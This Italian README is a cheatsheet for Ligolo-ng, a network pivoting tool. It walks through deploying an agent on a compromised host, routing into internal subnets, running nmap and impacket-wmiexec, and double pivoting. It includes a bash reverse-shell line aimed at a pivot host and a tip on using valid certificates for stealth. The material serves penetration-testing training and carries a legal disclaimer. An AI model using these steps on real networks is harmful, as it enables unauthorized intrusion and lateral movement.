<!-- language-home-navigation -->
[🏠 Home Page Italiana](../../README.it.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🔀 Ligolo-ng - Cheatsheet completo

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
  ██╗     ██╗ ██████╗  ██████╗ ██╗      ██████╗      ███╗   ██╗ ██████╗ 
  ██║     ██║██╔════╝ ██╔═══██╗██║     ██╔═══██╗     ████╗  ██║██╔════╝ 
  ██║     ██║██║  ███╗██║   ██║██║     ██║   ██║     ██╔██╗ ██║██║  ███╗
  ██║     ██║██║   ██║██║   ██║██║     ██║   ██║     ██║╚██╗██║██║   ██║
  ███████╗██║╚██████╔╝╚██████╔╝███████╗╚██████╔╝     ██║ ╚████║╚██████╔╝
  ╚══════╝╚═╝ ╚═════╝  ╚═════╝ ╚══════╝ ╚═════╝      ╚═╝  ╚═══╝ ╚═════╝ 
                 Advanced TUN-based Pivoting Tool
```
<palign="centro">
  <img src="https://img.shields.io/badge/Ligolo--ng-Pivoting-blue?style=for-the-badge" alt="Ligolo-ng">
  <img src="https://img.shields.io/badge/TUN_Interface-VPN_Style-green?style=for-the-badge" alt="Interfaccia TUN">
  <img src="https://img.shields.io/badge/Go-Cross_Platform-orange?style=for-the-badge" alt="Vai">
  <img src="https://img.shields.io/badge/Network_Pivoting-red?style=for-the-badge" alt="Network Pivoting">
</p>

<palign="centro">
  <b>🌐 Strumento pivot moderno, semplice e ad alte prestazioni che utilizza interfacce TUN anziché proxy SOCKS</b>
</p>

---

## 📋 Sommario

- [Introduzione](#-introduzione)
- [Perché Ligolo-ng? (Ligolo-ng vs SOCKS/Proxychains)](#-perché-ligolo-ng)
- [Architettura e come funziona](#-architettura--come-funziona)
- [Installazione](#-installazione)
- [Guida introduttiva](#-guida-introduttiva)
  - [Passaggio 1: configurazione dell'interfaccia TUN sull'attaccante](#step-1-setup-tun-interface-on-attacker)
  - [Passaggio 2: avviare il proxy Ligolo-ng](#step-2-start-the-ligolo-ng-proxy)
  - [Passaggio 3: distribuire l'agente su Pivot Target](#step-3-deploy-the-agent-on-pivot-target)
  - [Passaggio 4: Configura il routing sull'attaccante](#step-4-configure-routing-on-attacker)
  - [Passaggio 5: avvia la sessione del tunnel](#step-5-avvia-la-sessione-del-tunnel)
- [Reverse Port Forwarding (ascoltatori)](#-reverse-port-forwarding-listeners)
- [Doppio pivot (pivoting multilivello)](#-double-pivoting-multi-tier-pivoting)
- [Riferimento ai comandi interattivi proxy](#-proxy-interactive-commands-reference)
- [Opzioni della riga di comando dell'agente](#-agent-command-line-options)
- [Risoluzione dei problemi e migliori pratiche](#-risoluzione dei problemi--migliori pratiche)
- [Disclaimer legale](#-legal-disclaimer)
- [Risorse](#-risorse)

---

## 🎯 Introduzione

**Ligolo-ng** è uno strumento di tunneling e pivoting avanzato, leggero e veloce scritto in Go. A differenza dei proxy SOCKS tradizionali (come lo standard Chisel o l'inoltro dinamico SSH), Ligolo-ng stabilisce un'**interfaccia TUN** virtuale direttamente sulla macchina dell'aggressore.

Ciò trasforma il tuo host pivot compromesso in un vero gateway simile a una VPN: tutti gli strumenti sul computer dell'autore dell'attacco (inclusi `nmap -sS`, `crackmapexec`, `evil-winrm`, `impacket` e i browser) possono accedere alle sottoreti interne direttamente tramite l'indirizzo IP senza prefissare i comandi con `proxychains`.

---

## ⚖️ Perché Ligolo-ng?

| Caratteristica | Ligolo-ng | Catene proxy + CALZINI | CALZINI SSH (`-D`) |
|---------|-----------|---------------------|------------|
| **Supporto protocollo** | TCP e UDP completi | Solo TCP (UDP scadente) | Solo TCP |
| **Nmap SYN Scan (`-sS`)**| ✅ Sì (nativo) | ❌ No (richiede TCP `-sT`) | ❌No |
| **Compatibilità dello strumento** | 100% (stack IP del kernel) | Incoerente (LD_PRELOAD) | Incoerente |
| **Velocità e latenza** | ⭐⭐⭐⭐⭐ Molto veloce | ⭐⭐⭐ Moderato | ⭐⭐⭐ Moderato |
| **Nessun involucro CALZINI** | ✅ Sì | ❌ Richiede un involucro | ❌ Richiede un involucro |
| **Ascoltatori inversi** | ✅ Incorporato | ❌ Richiede uno strumento separato | ❌Limitato |

---

## 🏗️ Architettura e come funziona
```
+-------------------+                          +---------------------+                          +----------------------+
|  Attacker Machine |                          | Pivot Target (Host) |                          | Internal Subnet Host |
| (192.168.1.100)   |                          | (Dual-homed)        |                          | (172.16.1.50)        |
|                   |                          |                     |                          |                      |
| [proxy server]    | <=== TLS Tunnel =======> | [ligolo agent]      |                          |                      |
|    ^              |      (Port 11601)        |    |                |                          |                      |
|    |              |                          |    |                |                          |                      |
| [tun0 interface]  |                          |    +--------------->| == Internal Traffic ===> | [Target Service]     |
| (172.16.1.0/24)   |                          |     (172.16.1.10)   |                          | (Port 445, 80, etc.) |
+-------------------+                          +---------------------+                          +----------------------+
```
1. **Proxy:** viene eseguito sul computer dell'aggressore, gestisce le sessioni e collega i pacchetti tra l'interfaccia TUN virtuale e gli agenti connessi.
2. **Agente:** un file binario leggero eseguito sul computer interno compromesso (Linux, Windows, macOS o ARM).
3. **Interfaccia TUN:** un'interfaccia di rete di loopback software creata su Linux che instrada il traffico destinato alle sottoreti interne direttamente a Ligolo.

---

## 📥Installazione

Scarica gli ultimi file binari della versione sia per **proxy** che per **agent** dalla pagina ufficiale delle versioni di GitHub:
```bash
# Download latest proxy for Linux
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.2-alpha/ligolo-ng_proxy_0.7.2-alpha_linux_amd64.tar.gz
tar -zxvf ligolo-ng_proxy_0.7.2-alpha_linux_amd64.tar.gz -C /opt/ligolo-proxy/

# Download agents for various targets
# Linux Agent
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.2-alpha/ligolo-ng_agent_0.7.2-alpha_linux_amd64.tar.gz
tar -zxvf ligolo-ng_agent_0.7.2-alpha_linux_amd64.tar.gz -C /opt/ligolo-agents/linux/

# Windows Agent
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.2-alpha/ligolo-ng_agent_0.7.2-alpha_windows_amd64.zip
unzip ligolo-ng_agent_0.7.2-alpha_windows_amd64.zip -d /opt/ligolo-agents/windows/
```
---

## 🚀 Guida rapida

### Passaggio 1: impostare l'interfaccia TUN sull'attaccante

Prima di eseguire il proxy, crea un dispositivo TUN persistente sul computer Linux dell'autore dell'attacco:
```bash
# Create a TUN interface named "ligolo"
sudo ip tuntap add user $USER mode tun ligolo

# Bring the interface UP
sudo ip link set ligolo up

# Verify interface state
ip link show ligolo
```
### Passaggio 2: avviare il proxy Ligolo-ng

Esegui il proxy utilizzando certificati TLS autofirmati:
```bash
cd /opt/ligolo-proxy/
./proxy -self-cert -laddr 0.0.0.0:11601
```
> **Suggerimento:** puoi anche fornire certificati Let's Encrypt validi utilizzando `-certfile` e `-keyfile` per la furtività negli scontri con la squadra rossa.

### Passaggio 3: distribuire l'agente su Pivot Target

Trasferisci l'agente sul tuo host compromesso ed eseguilo:

#### Sulla destinazione Linux:
```bash
chmod +x agent
./agent -connect 192.168.1.100:11601 -ignore-cert
```
#### Sulla destinazione Windows:
```powershell
.\agent.exe -connect 192.168.1.100:11601 -ignore-cert
```
### Passaggio 4: configurare il routing sull'attaccante

Una volta che l'agente si è connesso, ispeziona le sue interfacce di rete dalla console proxy per determinare le sottoreti interne della destinazione (ad esempio, `172.16.1.0/24`).

Sul tuo **terminale dell'attaccante** (finestra separata), aggiungi un percorso che punta all'interfaccia TUN:
```bash
# Route internal subnet through ligolo TUN device
sudo ip route add 172.16.1.0/24 dev ligolo

# Check route table
ip route show | grep ligolo
```
### Passaggio 5: avvia la sessione del tunnel

Nel prompt interattivo del proxy Ligolo-ng:
```text
ligolo-ng » session
? Select a session: 1 - user@PIVOT-HOST - 192.168.1.50:52418
[Agent : user@PIVOT-HOST] » start
[Agent : user@PIVOT-HOST] » INFO[0025] Tunnel started
```
Ora hai accesso IP nativo e diretto alla rete interna! Provalo:
```bash
# Ping internal host
ping -c 3 172.16.1.50

# Native Nmap SYN scan without proxychains!
nmap -sS -Pn -T4 -p 80,445,3389 172.16.1.50

# Run Impacket directly
impacket-wmiexec DOMAIN/admin:Password@172.16.1.50
```
---

## 🔄 Port forwarding inverso (ascoltatori)

Desideri ricevere una shell inversa o intercettare un inoltro di autenticazione NTLM sul tuo dispositivo dell'aggressore da un host interno che non può reindirizzare all'IP dell'aggressore? Usa gli **ascoltatori**!

Quando configuri un ascoltatore in Ligolo-ng, l'agente apre una porta di ascolto sulla **macchina pivot** e inoltra il traffico in entrata alla macchina dell'aggressore.

### Esempio: prendere un guscio inverso

All'interno della sessione proxy:
```text
[Agent : user@PIVOT-HOST] » listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp
INFO[0035] Listener created on 0.0.0.0:4444
```
Sul tuo **computer dell'aggressore**:
```bash
nc -lvnp 4444
```
Su un **bersaglio interno** (`172.16.1.75`):
```bash
# Send reverse shell to the pivot host's internal IP
bash -i >& /dev/tcp/172.16.1.10/4444 0>&1
```
L'host pivot inoltra la connessione direttamente al tuo ascoltatore Netcat!

---

## ⛓️ Doppio Pivoting (Pivoting Multi-Tier)

Quando si accede a reti profondamente annidate (Sottorete A -> Sottorete B -> Sottorete C):

1. Stabilisci il tuo tunnel iniziale su Pivot 1 (`172.16.1.10`).
2. Individuare il Pivot 2 situato nella sottorete B (`10.0.0.25`).
3. Configura un ascoltatore su Pivot 1 per inoltrare il traffico dalla sottorete B alla porta proxy `11601`:
   ```text
   [Agent : Pivot1] » listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
   ```
4. Distribuisci l'agente Ligolo su Pivot 2 e connettiti all'IP di Pivot 1:
   ```bash
   ./agent -connect 172.16.1.10:11601 -ignore-cert
   ```
5. Una seconda sessione apparirà nel tuo proxy! Aggiungi un percorso per la sottorete C:
   ```bash
   sudo ip route add 10.0.0.0/24 dev ligolo
   ```
6. Passa alla sessione 2 e digita `start`.

---

## ⌨️ Riferimento ai comandi interattivi proxy

| Comando | Descrizione | Esempio |
|---------|-------------|---------|
| `session` | Elenca e seleziona le sessioni attive dell'agente connesso | `session` |
| `start` | Inizia il tunneling dei pacchetti attraverso l'agente attivo | `start` |
| `stop` | Arresta la sessione attiva del tunnel | `stop` |
| `ifconfig` | Mostra le interfacce di rete dell'agente selezionato | `ifconfig` |
| `listener_add` | Crea una porta di ascolto sull'agente pivot | `listener_add --addr 0.0.0.0:8443 --to 127.0.0.1:8443` |
| `listener_list`| Elenca tutti gli ascoltatori attivi sull'agente corrente | `listener_list` |
| `listener_close`| Chiudi un ascoltatore attivo specifico | `listener_close --id 0` |
| `help` | Visualizza la guida del comando | `help` |
| `exit` | Termina il proxy o torna al menu principale | `exit` |

---

## ⚙️ Opzioni della riga di comando dell'agente

| Bandiera | Descrizione | Esempio |
|------|-------------|---------|
| `-connect` | Indirizzo e porto del proxy Ligolo | `-connect 192.168.1.100:11601` |
| `-ignore-cert` | Salta la verifica del certificato TLS | `-ignore-cert` |
| `-retry` | Riprova automaticamente la connessione se disconnesso | `-retry` |
| `-auto-clear` | Cancella l'output del terminale al momento dell'esecuzione | `-auto-clear` |

---

## 💡 Risoluzione dei problemi e migliori pratiche

1. **Elimina interfaccia TUN dopo l'impegno:**
   Una volta terminato il test, ripulisci la tabella di routing ed elimina l'interfaccia virtuale:
   ```bash
   sudo ip link set ligolo down
   sudo ip tuntap del mode tun ligolo
   ```
2. **Ricontrollare le sovrapposizioni delle sottoreti IP:**
   Assicurati che la sottorete interna che stai instradando (ad esempio `192.168.1.0/24`) non entri in collisione con la rete locale dell'aggressore. Se si sovrappone, utilizzare un percorso host `/32` più specifico (ad esempio, `sudo ip route add 192.168.1.50/32 dev ligolo`).
3. **Considerazioni sul firewall su Pivot:**
   Sulle destinazioni Windows, assicurati che Windows Defender Firewall consenta connessioni in uscita sulla porta 11601 o sulla porta del listener scelta.
4. **Utilizza `-retry` in ambienti reali:**
   Esegui sempre gli agenti con `-retry` per ristabilire automaticamente le connessioni dopo interruzioni temporanee della rete.

---

## ⚠️ Disclaimer legale

> **IMPORTANTE:** Ligolo-ng è una potente utility di routing di rete. Deve essere utilizzato solo durante test di penetrazione autorizzati, impegni con team rossi e valutazioni di sicurezza etica con esplicito consenso scritto.

---

## 📚 Risorse

- [Repository ufficiale Ligolo-ng GitHub](https://github.com/nicocha30/ligolo-ng)
- [Documentazione ufficiale di Ligolo-ng](https://github.com/nicocha30/ligolo-ng/blob/master/DOCUMENTATION.md)